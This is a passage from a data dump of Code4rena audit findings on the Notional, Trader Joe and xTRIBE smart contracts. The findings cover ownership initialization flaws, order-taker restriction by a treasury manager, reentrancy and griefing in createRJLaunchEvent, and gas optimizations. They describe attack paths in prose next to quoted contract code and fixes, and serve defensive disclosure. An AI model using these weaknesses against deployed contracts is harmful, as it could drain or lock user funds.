    "body": "# Handle\n\nleastwood\n\n\n# Vulnerability details\n\n## Impact\n\nThe `sNOTE` and `TreasuryManager` contracts both inherit the `BoringOwnable` contract which is compatible with the `UUPSUpgradeable` standard. This contract allows for a two-step ownership pattern, however, the respective `initialize` functions do not adhere to this pattern. As a result, if there is any mistake in the upgrade process and the `owner` state variable is mistakenly set to the wrong account, all funds will be locked in the `TreasuryManager` contract and `sNOTE` will no longer be able to cover any collateral shortfalls.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/BoringOwnable.sol\n\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L71-L86\n```\nfunction initialize(\n    address _owner,\n    uint32 _coolDownTimeInSeconds\n) external initializer {\n    string memory _name = \"Staked NOTE\";\n    string memory _symbol = \"sNOTE\";\n    __ERC20_init(_name, _symbol);\n    __ERC20Permit_init(_name);\n\n    coolDownTimeInSeconds = _coolDownTimeInSeconds;\n    owner = _owner;\n    NOTE.safeApprove(address(BALANCER_VAULT), type(uint256).max);\n    WETH.safeApprove(address(BALANCER_VAULT), type(uint256).max);\n\n    emit OwnershipTransferred(address(0), _owner);\n}\n```\n\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryManager.sol#L71-L76\n```\nfunction initialize(address _owner, address _manager) external initializer {\n    owner = _owner;\n    manager = _manager;\n    emit OwnershipTransferred(address(0), _owner);\n    emit ManagementTransferred(address(0), _manager);\n}\n```\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nAs the governance contract is expected to be the one who initiates and executes upgrades to these contracts, it might make sense to set `owner` to `msg.sender`. Upon initial deployment, the deployer can transfer over ownership of the contracts using the `transferOwnership` and `claimOwnership` functions, allowing Notional's governance to takeover.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-notional-findings",
      "repo": "https://github.com/code-423n4/2022-01-notional-findings",
      "url": "https://github.com/code-423n4/2022-01-notional-findings/issues/223"
    }
  },
  {
    "title": "Optimization on _redeemAndTransfer",
    "body": "# Handle\n\nTomio\n\n\n# Vulnerability details\n\n## Impact\nThere is unnecessary if else condition on _redeemAndTransfer(), and can be optimized by removing the inline if else condition on line https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L137-L140\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L137-L140\n\n## Tools Used\n\n## Recommended Mitigation Steps\nFrom:\n```\n    if (underlying.tokenAddress == address(0)) {\n            WETH9(WETH).deposit{value: address(this).balance}();\n        }\n\n        address underlyingAddress = underlying.tokenAddress == address(0)\n            ? address(WETH)\n            : underlying.tokenAddress;\n        IERC20(underlyingAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying);\n```\n\nTo:\n```\n    if (underlying.tokenAddress == address(0)) {\n            WETH9(WETH).deposit{value: address(this).balance}();\n            IERC20(WETH).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying);\n        }else{\n            IERC20(underlying.tokenAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying);\n        }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-notional-findings",
      "repo": "https://github.com/code-423n4/2022-01-notional-findings",
      "url": "https://github.com/code-423n4/2022-01-notional-findings/issues/213"
    }
  },
  {
    "title": "`_validateOrder` Does Not Allow Anyone To Be A Taker Of An Off-Chain Order",
    "severity": "medium",
    "body": "# Handle\n\nleastwood\n\n\n# Vulnerability details\n\n## Impact\n\nThe `EIP1271Wallet` contract intends to allow the treasury manager account to sign off-chain orders in 0x on behalf of the `TreasuryManager` contract, which holds harvested assets/`COMP` from Notional. While the `EIP1271Wallet._validateOrder` function mostly prevents the treasury manager from exploiting these orders, it does not ensure that the `takerAddress` and `senderAddress` are set to the zero address. As a result, it is possible for the manager to have sole rights to an off-chain order and due to the flexibility in `makerPrice`, the manager is able to extract value from the treasury by maximising the allowed slippage.\n\nBy setting `takerAddress` to the zero address, any user can be the taker of an off-chain order. By setting `senderAddress` to the zero address, anyone is allowed to access the exchange methods that interact with the order, including filling the order itself. Hence, these two order addresses can be manipulated by the manager to effectively restrict order trades to themselves.\n\n## Proof of Concept\n\nhttps://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibOrder.sol#L66\n```\naddress takerAddress;           // Address that is allowed to fill the order. If set to 0, any address is allowed to fill the order.\n```\n\nhttps://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250\n\nhttps://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L354-L374\n\n\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188\n```\nfunction _validateOrder(bytes memory order) private view {\n    (\n        address makerToken,\n        address takerToken,\n        address feeRecipient,\n        uint256 makerAmount,\n        uint256 takerAmount\n    ) = _extractOrderInfo(order);\n\n    // No fee recipient allowed\n    require(feeRecipient == address(0), \"no fee recipient allowed\");\n\n    // MakerToken should never be WETH\n    require(makerToken != address(WETH), \"maker token must not be WETH\");\n\n    // TakerToken (proceeds) should always be WETH\n    require(takerToken == address(WETH), \"taker token must be WETH\");\n\n    address priceOracle = priceOracles[makerToken];\n\n    // Price oracle not defined\n    require(priceOracle != address(0), \"price oracle not defined\");\n\n    uint256 slippageLimit = slippageLimits[makerToken];\n\n    // Slippage limit not defined\n    require(slippageLimit != 0, \"slippage limit not defined\");\n\n    uint256 oraclePrice = _toUint(\n        AggregatorV2V3Interface(priceOracle).latestAnswer()\n    );\n\n    uint256 priceFloor = (oraclePrice * slippageLimit) /\n        SLIPPAGE_LIMIT_PRECISION;\n\n    uint256 makerDecimals = 10**ERC20(makerToken).decimals();\n\n    // makerPrice = takerAmount / makerAmount\n    uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;\n\n    require(makerPrice >= priceFloor, \"slippage is too high\");\n}\n```\n\n## Tools Used\n\nManual code review.\nDiscussions with Notional team.\n\n## Recommended Mitigation Steps\n\nConsider adding `require(takerAddress == address(0), \"manager cannot set taker\");` and `require(senderAddress == address(0), \"manager cannot set sender\");` statements to `_validateOrder`. This should allow any user to fill an order and prevent the manager from restricting exchange methods to themselves.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-notional-findings",
      "repo": "https://github.com/code-423n4/2022-01-notional-findings",
      "url": "https://github.com/code-423n4/2022-01-notional-findings/issues/152"
    }
  },
  {
    "title": "Unsafe call to decimals()",
    "severity": "minor",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nThis is an issue as well as a gas improvment. Create pair adjusts token amounts based on floor price:\n```solidity \n    if (\n        floorPrice > (wavaxReserve * 10**token.decimals()) / tokenAllocated\n    ) {\n        tokenAllocated = (wavaxReserve * 10**token.decimals()) / floorPrice;\n```\n\nThe problem is that .decimals() is not part of the official ERC20 standard and might fail for tokens that do not implement it. While in practice it is very unlikely, as usually most of the tokens implement it, this should still be considered as a valid concern, especially considering that createPair can only be called once after phase 3 has started.\n\n## Recommended Mitigation Steps\nThe current approach may be useful in case the token can change its decimals (usually very unlikely but possible), but I think a better solution would be to initialize the decimals in the initialize function or at least make a test call to see if this token is compatible. \nAnother possibility is to write a helper function, e.g. similar to the popular safeTransfer.\n\nAnd finally, a gas improvement here would be to avoid this duplicate external call and multiplication: (wavaxReserve * 10**token.decimals())\nYou should cache the result and re-use it inside the if statement.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-trader-joe-findings",
      "repo": "https://github.com/code-423n4/2022-01-trader-joe-findings",
      "url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/291"
    }
  },
  {
    "title": "Mark unchanging variables immutable",
    "body": "# Handle\n\nCzar102\n\n\n# Vulnerability details\n\n## Impact\nStorage variable reads are gas-intensive, mark unchanging variables immutable in the case of non-upgradeable contracts.\n\n## Examples\n\n```\nRochetJoeStaking.sol#33: IERC20Upgradeable public joe;\nRochetJoeStaking.sol#41: RocketJoeToken public rJoe;\nRochetJoeFactory.sol#23: address public override rJoe;\nRochetJoeFactory.sol#25: address public override wavax;\n```\n\n## Tools Used\nManual analysis\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-trader-joe-findings",
      "repo": "https://github.com/code-423n4/2022-01-trader-joe-findings",
      "url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/274"
    }
  },
  {
    "title": "`createRJLaunchEvent()` Multiple `launchEvent` can be created unexpectedly by reentrancy",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-trader-joe/blob/119e12d715ececc31478e833297f124cc15d27c2/contracts/RocketJoeFactory.sol#L97-L154\n\n```solidity\nfunction createRJLaunchEvent(\n    address _issuer,\n    uint256 _phaseOneStartTime,\n    address _token,\n    uint256 _tokenAmount,\n    uint256 _tokenIncentivesPercent,\n    uint256 _floorPrice,\n    uint256 _maxWithdrawPenalty,\n    uint256 _fixedWithdrawPenalty,\n    uint256 _maxAllocation,\n    uint256 _userTimelock,\n    uint256 _issuerTimelock\n) external override returns (address) {\n    require(\n        getRJLaunchEvent[_token] == address(0),\n        \"RJFactory: token has already been issued\"\n    );\n    require(_issuer != address(0), \"RJFactory: issuer can't be 0 address\");\n    require(_token != address(0), \"RJFactory: token can't be 0 address\");\n    require(_token != wavax, \"RJFactory: token can't be wavax\");\n    require(\n        _tokenAmount > 0,\n        \"RJFactory: token amount needs to be greater than 0\"\n    );\n    require(\n        IJoeFactory(factory).getPair(_token, wavax) == address(0) ||\n            IJoePair(IJoeFactory(factory).getPair(_token, wavax))\n                .totalSupply() ==\n            0,\n        \"RJFactory: liquid pair already exists\"\n    );\n\n    address launchEvent = Clones.clone(eventImplementation);\n\n    // msg.sender needs to approve RocketJoeFactory\n    IERC20(_token).transferFrom(msg.sender, launchEvent, _tokenAmount);\n\n    ILaunchEvent(payable(launchEvent)).initialize(\n        _issuer,\n        _phaseOneStartTime,\n        _token,\n        _tokenIncentivesPercent,\n        _floorPrice,\n        _maxWithdrawPenalty,\n        _fixedWithdrawPenalty,\n        _maxAllocation,\n        _userTimelock,\n        _issuerTimelock\n    );\n\n    getRJLaunchEvent[_token] = launchEvent;\n    isRJLaunchEvent[launchEvent] = true;\n    allRJLaunchEvents.push(launchEvent);\n\n    _emitLaunchedEvent(_issuer, _token, _phaseOneStartTime);\n\n    return launchEvent;\n}\n```\n\nAt L132, `_token.transferFrom()` can be used to re-enter the `createRJLaunchEvent()` function, before the storage change at L147-149.\n\nThis will allow the attacker to create multiple `launchEvent` contracts and get them listed in `allRJLaunchEvents`.\n\nEven though there is no significant impact as far as we can tell from the smart contract code. We believe this is still unexpected and may cause other parts of the system, say the frontend to malfunction in some cases.\n\n### Recommendation\n\nConsider moving L132 `_token.transferFrom()` to after L147-149 to prevent re-entrance.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-trader-joe-findings",
      "repo": "https://github.com/code-423n4/2022-01-trader-joe-findings",
      "url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/248"
    }
  },
  {
    "title": "`createRJLaunchEvent()` can be called by anyone with 1 Wei of `_token` and stop others from creating RJLaunchEvent with the same token anymore",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-trader-joe/blob/119e12d715ececc31478e833297f124cc15d27c2/contracts/RocketJoeFactory.sol#L97-L132\n\n```solidity\nfunction createRJLaunchEvent(\n    address _issuer,\n    uint256 _phaseOneStartTime,\n    address _token,\n    uint256 _tokenAmount,\n    uint256 _tokenIncentivesPercent,\n    uint256 _floorPrice,\n    uint256 _maxWithdrawPenalty,\n    uint256 _fixedWithdrawPenalty,\n    uint256 _maxAllocation,\n    uint256 _userTimelock,\n    uint256 _issuerTimelock\n) external override returns (address) {\n    require(\n        getRJLaunchEvent[_token] == address(0),\n        \"RJFactory: token has already been issued\"\n    );\n    require(_issuer != address(0), \"RJFactory: issuer can't be 0 address\");\n    require(_token != address(0), \"RJFactory: token can't be 0 address\");\n    require(_token != wavax, \"RJFactory: token can't be wavax\");\n    require(\n        _tokenAmount > 0,\n        \"RJFactory: token amount needs to be greater than 0\"\n    );\n    require(\n        IJoeFactory(factory).getPair(_token, wavax) == address(0) ||\n            IJoePair(IJoeFactory(factory).getPair(_token, wavax))\n                .totalSupply() ==\n            0,\n        \"RJFactory: liquid pair already exists\"\n    );\n\n    address launchEvent = Clones.clone(eventImplementation);\n\n    // msg.sender needs to approve RocketJoeFactory\n    IERC20(_token).transferFrom(msg.sender, launchEvent, _tokenAmount);\n```\n\nIn the current implementation, `RocketJoeFactory.sol#createRJLaunchEvent()` can be called by anyone with at least 1 Wei of `_token`.\n\nThis allows a malicious user or attacker to call `createRJLaunchEvent()` with minimal cost and stop others, especially the platform itself or the rightful issuer of the token from creating the RJLaunchEvent.\n\n### Recommendation\n\nConsider making `createRJLaunchEvent()` only callable by the owner of `RocketJoeFactory`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-trader-joe-findings",
      "repo": "https://github.com/code-423n4/2022-01-trader-joe-findings",
      "url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/247"
    }
  },
  {
    "title": "QA Report",
    "body": "## Issue #1 (Low) - Floating pragma\nContracts contain a floating pragma. It is recommended to deploy all contracts with a single, specific compiler version to reduce the risk of compiler-specific bugs and contracts deployed with different versions. In the case of the forked contacts, I recommend deploying with the exact version that the current live versions were deployed with.\n\nhttps://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L4\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/xERC4626.sol#L4\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L3\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L4\n\n## Issue #2 (Low) - Comment vs code conflict\nThis comment indicates that rewards are calculated and sent to flywheel core, but the funds are not actually sent.\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L213\n\n## Issue #3 (Low) - Claiming rewards does not update rewards balance automatically\nUser calls `claim()` but reward balance does not update within function. They will only receive the reward balance at the time of the last `accrue()`. Would it be feasible to add the accrue() functions at the beginning of the `claim()` call?\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L119\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/97"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "[`decrementWeightUntilFree`](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L560-L565) can be optimized by using `_userGauges[user].at(i)` and `_userGauges[user].length()` directly instead of storing `_userGauges[user].values()` as `gaugeList` and calling `gaugeList.length` and `gaugeList[i]`.\n\nImplementation:\n```solidity\nfunction _decrementWeightUntilFree(address user, uint256 weight) internal {\n    uint256 userFreeWeight = balanceOf[user] - getUserWeight[user];\n\n    // early return if already free\n    if (userFreeWeight >= weight) return;\n\n    uint32 currentCycle = _getGaugeCycleEnd();\n\n    // cache totals for batch updates\n    uint112 userFreed;\n    uint112 totalFreed;\n\n    // Loop through all user gauges, live and deprecated\n    //address[] memory gaugeList = _userGauges[user].values();\n\n    // Free gauges until through entire list or under weight\n    uint256 size = _userGauges[user].length();\n    //uint256 size = gaugeList.length;\n    for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight; ) {\n        //address gauge = gaugeList[i];\n        address gauge = _userGauges[user].at(i);\n        uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];\n        if (userGaugeWeight != 0) {\n            // If the gauge is live (not deprecated), include its weight in the total to remove\n            if (!_deprecatedGauges.contains(gauge)) {\n                totalFreed += userGaugeWeight;\n            }\n            userFreed += userGaugeWeight;\n            _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n\n    getUserWeight[user] -= userFreed;\n    _writeGaugeWeight(_totalWeight, _subtract, totalFreed, currentCycle);\n}\n```\n\nGas testing function:\n```solidity\nfunction testGasGauge() public {\n    token.mint(address(this), 100e18);\n    token.setMaxGauges(5);\n\n    uint160 i = 1; // address 0 causes reverts\n    while (i < 3) {\n        token.addGauge(address(i));\n        token.incrementGauge(address(i), 50e18);\n        i++;\n    }\n\n    startMeasuringGas(\"transfer call\");\n    token.transfer(address(1000000), 1);\n    stopMeasuringGas();\n}\n``` ",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/95"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Reorder Struct for saving more gas\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L52\n\nThis implementation below can saving more gas instead\n\n##Recommendation Mitigation\n\n```\n    struct Weight {\n        uint32 currentCycle;\n        uint112 storedWeight;\n        uint112 currentWeight;\n    }\n```\n\n2. change `uint256 i = 0` into `uint i `for saving more gas\n\nusing this implementation can saving more gas for each loops.\n\n##Tool Used\nManual Review\n\n##Recommended Mitigation\nChange it\n\n##Occurances\n\n```\nsrc/token/ERC20MultiVotes.sol#L346\nsrc/token/ERC20Gauges.sol#L134\nsrc/token/ERC20Gauges.sol#L184\nsrc/token/ERC20Gauges.sol#L307\nsrc/token/ERC20Gauges.sol#L384\nsrc/token/ERC20Gauges.sol#L564\n\n```\n\n3. Saving gas by removing ` = 0`\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L354\n\nIf a variable was not set/initialized, it is assumed to have default value to 0\nthis implementation was used for saving more gas by removing `= 0`\n\n##TOOLS USED\nManual Review\n\n##Mitigation Step\nRemove `= 0`\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/89"
    }
  },
  {
    "title": "QA Report",
    "body": "# LOW\n\n### L-01: Floating outdated pragma\n\n```\npragma solidity ^0.8.0;\n```\n\nUsing a floating pragma (^) might result in the contract being deployed with a version it was not tested with and might result in bugs that affect the contract system negatively. In addition, older compilers might be susceptible to some bugs.\nA list of known compiler bugs and their severity can be found here: https://etherscan.io/solcbuginfo\n\n- Recommendation\n  Locking the pragma (deleting the ^) helps to ensure that contracts do not accidentally get deployed using an outdated compiler version or a version it was not tested with. In addition I recommend changing the solidity version pragma to the latest version to enforce the use of an up-to-date compiler.\n\n\n# NON-CRITICAL\n\n### N-01: `transfer` and `transferFrom` can be set to external.\n\n[ERC20Gauges.transfer; L531-543](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L531-L543)\n[ERC20MultiVotes.transfer; L316-328](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L316-L328)\n\nThere are no function inside the contract calling `transfer` and `transferFrom`, therefore they can be made external to improve code clarity/readability.\n\n### N-02: No zero address check when setting `_owner` in `FlywheelGaugerRewards.sol`\n\n[FlywheelGaugeRewards.constructor](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L80-L95)\n\nContract will need to be relaunched if owner is mistakenly set to address zero.\n\nI recommend implementing a zero address check when setting an important role like owner.\n\n### N-03: Malicious ERC20 or ERC777 could not `_burn` as expected.\n\n[xTribe.\\_burn](https://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L116-L124)\n\n`_burn` function in an untrusted ERC20/ERC777 could perform detrimental actions which could negatively impact the system. I could not think of anything specific but should be something to keep in mind.\n\nRecommend verifying an having a whitelist of allowed ERC20/ERC777 tokens if not already in place.",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/87"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. \nTitle: Using delete statement to empty `rewardsAccrued` can save gas\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L123\n\nRecommended Mitigation Steps:\nChange to:\n```\n\tdelete rewardsAccrued[user];\n```\n\n========================================================================\n\n2. \nTitle: Using != is more gas efficient\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L167\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L218\n\nRecommended Mitigation Steps:\nChange to:\n```\n\tif (oldRewardBalance != 0) {\n```\n\n========================================================================\n\n3.\nTitle: Using `storage` to declare Struct variable inside function\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L85\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L106\n\nRecommended Mitigation Steps:\ninstead of caching `RewardsState` to memory. read it directly from storage.\n```\n\tRewardsState storage state = strategyState[strategy];\n```\n\n========================================================================\n\n4.\nTitle: Using `calldata` on struct parameter\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L210\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L241\n\nRecommended Mitigation Steps:\nUsing `calldata` to store struct data type can save gas\n```\n\tfunction accrueStrategy(ERC20 strategy, RewardsState calldata state)\n```\n\n========================================================================\n\n5.\nTitle: Using unchecked to calculate can save gas\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelStaticRewards.sol#L60\n\nRecommended Mitigation Steps:\n`rewards.rewardsEndTimestamp` is checked that it won't `>` than `lastUpdatedTimestamp`\n```\nunchecked{\n\telapsed = rewards.rewardsEndTimestamp - lastUpdatedTimestamp;\n}\n```\n\n========================================================================\n\n6.\nTitle: Using > is cheaper than >=\n\nProof of Concept:\nhttps://github.com/Rari-Capital/solmate/blob/9f16db2144cc9a7e2ffc5588d4bf0b66784283bd/src/tokens/ERC20.sol#L125\n\nRecommended Mitigation Steps:\njust use `>` can save gas\nChange to:\n```\n\trequire(deadline > block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n```\n\n========================================================================\n\n7.\nTitle: Using `immutable` can save gas\n\nProof of Concept:\nhttps://github.com/Rari-Capital/solmate/blob/9f16db2144cc9a7e2ffc5588d4bf0b66784283bd/src/tokens/ERC20.sol#L23\n\nRecommended Mitigation Steps:\nuse `immutable` to declare variable which set once in constructor\n\n========================================================================\n\n8.\nTitle: Using multiple `require` instead `&&` can save gas\n\nProof of Concept:\nhttps://github.com/Rari-Capital/solmate/blob/9f16db2144cc9a7e2ffc5588d4bf0b66784283bd/src/tokens/ERC20.sol#L154\n\nRecommended Mitigation Steps:\nChange to:\n```\n\trequire(recoveredAddress != address(0), \"INVALID_SIGNER\");\n\trequire(recoveredAddress == owner, \"INVALID_SIGNER\");\n```\n\n========================================================================\n\n9.\nTitle: unnecessary value set. the default value of uint is 0.\n\nProof of Concept:\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L134\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L184\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L307\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L384\n\nRecommended Mitigation Steps:\nremove 0 value can save gas\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/84"
    }
  },
  {
    "title": "QA Report",
    "body": "## N-01: Check ```newMax``` and ```oldMax``` values in ```setMaxDelegates``` function of ```ERC20MultiVotes.sol```\n\n### Description\n\nIn the ```setMaxDelegates``` function for ```ERC20MultiVotes.sol```, if ```newMax``` is less than ```oldMax``` there might be some accounts with more delegates than what the new maxDelegates value allows. \n\nAdding the condition ```newMax``` >= ```oldMax``` would fix this issue.\n\n\n\n## N-02: Cannot set ```canContractExceedMaxDelegates``` to false in ```setContractExceedMaxDelegates``` function of ```ERC20MultiVotes.sol```\n\n### Description\n\nIf the ```canExceedMax``` argument is set to false, the function ```canContractExceedMaxDelegates``` will revert not allowing an authorized admin to revoke the ability for an account to exceed the max delegates allowed. \n\nRemoving the ```canExceedMax``` from the condition in the function should allow ```canContractExceedMaxDelegates``` to be set to false.",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/83"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. making some constants as non-publict to save gas\n\nChange `public` to `private` or `internal` can save gas when constant isn't used outside of its contract.\n\nPOC :\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L201\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L368\n\n\n2. use custom error instead revert string to save gas\n\ncustom error from solidity 0.8.4 are cheaper than revert strings, custom error are defined using the `error` statement can use insideand outside the contract.\n\nPOC :\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L147",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/79"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## 1. Put revert on the first line to save gas\n \n### Summary\nIt is better to put revert before doing anything to save gas\n\n### POC\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/xERC4626.sol#L79\n\nbefore\n'''\n\n\tfunction syncRewards() public virtual {\n\t\tuint192 lastRewardAmount_ = lastRewardAmount;\n\t\tuint32 timestamp = block.timestamp.safeCastTo32();\n   \t\tif (timestamp < rewardsCycleEnd) revert SyncError();\n   \t        //some code\n \t}\n'''\n\nafter\n'''\n\n\tfunction syncRewards() public virtual {\n   \t\tuint32 timestamp = block.timestamp.safeCastTo32();\n   \t\tif (timestamp < rewardsCycleEnd) revert SyncError();\n   \t\tuint192 lastRewardAmount_ = lastRewardAmount;\n   \t\t//some code\n \t}\n'''\n\n==========================\n\n\n## 2. Separate revert condition so revert can be executed earlier to save gas\n\n### POC\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L461\n\nBefore\n'''\n\n\tfunction _addGauge(address gauge) internal returns (uint112 weight) {\n        \tbool newAdd = _gauges.add(gauge);\n        \tbool previouslyDeprecated = _deprecatedGauges.remove(gauge);\n        \tif (gauge == address(0) || !(newAdd || previouslyDeprecated)) revert InvalidGaugeError();\n        \tuint32 currentCycle = _getGaugeCycleEnd();\n\t\t//some codes\n\t}\n\n'''\n\nAfter\n'''\n\n\tfunction _addGauge(address gauge) internal returns (uint112 weight) {\n\t\tif(gauge == address(0)) revert InvalidGaugeError();\n        \tbool newAdd = _gauges.add(gauge);\n        \tbool previouslyDeprecated = _deprecatedGauges.remove(gauge);\n        \tif (!(newAdd || previouslyDeprecated)) revert InvalidGaugeError();\n        \tuint32 currentCycle = _getGaugeCycleEnd();\n\t\t//some codes\n\t}\n\n'''\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/77"
    }
  },
  {
    "title": "QA Report",
